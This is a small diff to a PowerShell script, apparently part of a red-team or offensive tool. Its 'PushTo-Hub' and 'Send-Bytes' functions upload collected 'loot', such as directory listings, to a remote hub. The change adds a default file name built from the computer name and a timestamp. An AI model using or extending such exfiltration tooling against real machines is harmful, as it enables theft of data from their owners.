@@ -550,6 +550,9 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 $Body = $result | ConvertTo-Json
                 $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
             }
+            if (-not $Name) {
+                $Name = "{0}_{1}.dat" -f $Env:COMPUTERNAME, (Get-Date -Format o)
+            }
             Send-Bytes -LootId $LootId $Body $Name
         } else {
             ForEach ($file in $Files) {
